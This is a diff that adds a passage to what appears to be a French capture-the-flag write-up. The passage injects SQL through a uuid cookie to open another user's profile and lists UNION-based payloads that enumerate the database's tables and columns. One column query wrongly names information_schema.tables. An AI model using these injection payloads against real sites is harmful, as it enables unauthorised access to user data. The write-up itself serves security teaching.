@@ -39,6 +39,22 @@ On arrive alors sur un espace personnel avec rien de particulier a premiere vue,
 
 <p align="center"><img src="Profil.png" alt="Profil" width="500"></p>
 
+En inspectant le code de la page, on voit que l'on a récupéré un cookie uuid, on va alors tenter d'injecter la commande `' or 1=1 -- a` dans la valeur du uuid et là ça marche, on tombe sur le profil d'un autre utilisateur.
+
+<p align="center"><img src="SQL Injections.png" alt="SQL Injections" width="500"></p>
+
+
+Pour obtenir plus d'information, on va entrer les injections SQL suivantes : 
+```
+# On cherche le nombre de champs récupère par la requête, on fini par trouver le nombre de 3 champs
+UNION SELECT 1,2,3 -- a '
+
+# On cherche les différentes tables présentent dans la base de données.
+UNION SELECT group_concat(table_name), null, null FROM information_schema.tables -- a '
+
+# On cherche les différentes tables présentent dans la base de données.
+UNION SELECT group_concat(column_name), null, null FROM information_schema.tables WHERE table_name='users' -- a '
+```
 
 ## Flag
 
